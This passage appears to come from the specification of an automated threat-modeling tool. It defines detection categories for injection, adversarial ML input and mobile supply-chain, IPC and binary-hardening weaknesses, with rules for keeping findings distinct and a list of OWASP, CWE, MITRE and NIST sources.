- **Pattern Category 9** (Injection Attacks Beyond SQL — pre-existing) detects OS command, LDAP, NoSQL, expression-language, server-side template, and header injection at generic API endpoints constructing queries or commands by string concatenation. The architectural-tell is a generic API endpoint constructing a query/command/header from untrusted input without parameterization.
- **Pattern Category 10** (Adversarial Input Manipulation, Predictive ML — F-6) detects adversarial-evasion attacks against a deployed predictive ML classifier or regressor at inference time. The architectural-tell is a deployed predictive ML inference endpoint ingesting raw user-controlled features without an input-validation barrier or adversarial-defense control.
- **Pattern Category 11** (Mobile Supply Chain Integrity — F-7 / OWASP M2:2024) detects mobile SDK ingestion gaps on declared mobile clients. The architectural-tell is a mobile client integrating third-party SDKs via Gradle / CocoaPods / SPM without checksum verification, signed-artifact policy, or app-store-only distribution — distinct from the generic build-pipeline supply-chain surface of Cat 8 by the mobile-platform topology indicator.
- **Pattern Category 12** (Mobile IPC Input Validation — F-7 / OWASP M4:2024) detects mobile-IPC-input-side validation gaps on declared mobile clients — Android Intent extras, iOS URL-scheme parameters, deep-link handlers, ContentProvider arguments, pasteboard injections. The architectural-tell is a mobile client with exported Activities / Services / BroadcastReceivers, URL-scheme handlers, or ContentProviders reaching trusted operations without permission gating, claim verification, or per-Intent caller verification — distinct from generic injection (Cat 9) by the mobile IPC architectural-tell.
- **Pattern Category 12 cross-link to F-1 `output-integrity` boundary**: The F-1 `output-integrity` agent owns LLM-output-side sanitization on LLM-serving architectures. **Pattern Category 12 owns mobile-IPC-input-side validation on mobile-platform architectures.** The two surfaces are architecturally disjoint per ADR-036 D-5 — same hybrid architecture exhibiting both an exported Activity AND an LLM tool-call output sink may legitimately surface BOTH a tampering Cat 12 finding AND an output-integrity finding without duplication, because the architectural-tells (Intent extras parsing vs. LLM tool-call output rendering) are independent.
- **Pattern Category 13** (Insufficient Mobile Binary Protections — F-7 / OWASP M7:2024) detects mobile binary-tier runtime hardening gaps on declared mobile-client production builds — root/jailbreak detection, anti-tampering stubs, code obfuscation, symbol stripping, and emulator-detection on fraud-sensitive flows. The architectural-tell is a mobile client production build shipped without these runtime-protection controls — distinct from the build-time code/configuration tampering surface of Cat 4 by the mobile-binary runtime-hardening axis.

Same hybrid architecture (web + predictive-ML + mobile + LLM) may legitimately surface Pattern Category 9 + Pattern Category 10 + Pattern Categories 11/12/13 findings without duplication, because they target different architectural surfaces (generic API / predictive-ML inference / mobile SDK supply chain / mobile IPC / mobile binary). They are not duplicates and MUST NOT be merged in `threat-report.md`. Architect formalizes the F-6 carve in ADR-035 Decision 9 (three-companion disambiguation requirement) and the F-7 carve plus F-1 cross-axis annotation in ADR-036 D-5 / D-9 (Pattern Category Disambiguation requirement on the F-7 tampering companion with explicit `output-integrity` boundary cross-link).

## Primary Sources

- OWASP Top 10 2021 — A03: Injection
- OWASP Top 10 2021 — A08: Software and Data Integrity Failures
- OWASP API Security Top 10 2023 — API3: Broken Object Property Level Authorization
- OWASP Input Validation Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
- OWASP Cross-Site Request Forgery Prevention Cheat Sheet
- CWE-20: Improper Input Validation
- CWE-89: SQL Injection
- CWE-345: Insufficient Verification of Data Authenticity
- CWE-352: Cross-Site Request Forgery
- CWE-494: Download of Code Without Integrity Check
- MITRE ATT&CK T1565: Data Manipulation
- MITRE ATT&CK T1195: Supply Chain Compromise
- NIST SP 800-53 SI-7: Software, Firmware, and Information Integrity
- CWE-502 Deserialization of Untrusted Data: https://cwe.mitre.org/data/definitions/502.html
- OWASP Top 10 2021 A08 (canonical URL): https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/
- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- MITRE ATT&CK T1195 Supply Chain Compromise: https://attack.mitre.org/techniques/T1195/
- MITRE ATT&CK T1195.001 Compromise Software Dependencies and Development Tools: https://attack.mitre.org/techniques/T1195/001/
- MITRE ATT&CK T1195.002 Compromise Software Supply Chain: https://attack.mitre.org/techniques/T1195/002/
- CWE-494 Download of Code Without Integrity Check (canonical URL): https://cwe.mitre.org/data/definitions/494.html
- OWASP Top 10 2021 A03 (canonical URL): https://owasp.org/Top10/A03_2021-Injection/
- CWE-78 OS Command Injection: https://cwe.mitre.org/data/definitions/78.html
- CWE-90 LDAP Injection: https://cwe.mitre.org/data/definitions/90.html
- CWE-943 NoSQL Query Logic Injection: https://cwe.mitre.org/data/definitions/943.html
- CWE-917 Expression Language Injection: https://cwe.mitre.org/data/definitions/917.html
- OWASP Command Injection Defense Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- OWASP ML01:2023 — Input Manipulation Attack: https://owasp.org/www-project-machine-learning-security-top-10/docs/ML01_2023-Input_Manipulation_Attack
- OWASP M2:2024 — Inadequate Supply Chain Security: https://owasp.org/www-project-mobile-top-10/2023-risks/m2-inadequate-supply-chain-security
- OWASP M4:2024 — Insufficient Input/Output Validation: https://owasp.org/www-project-mobile-top-10/2023-risks/m4-insufficient-input-output-validation
- OWASP M7:2024 — Insufficient Binary Protections: https://owasp.org/www-project-mobile-top-10/2023-risks/m7-insufficient-binary-protections
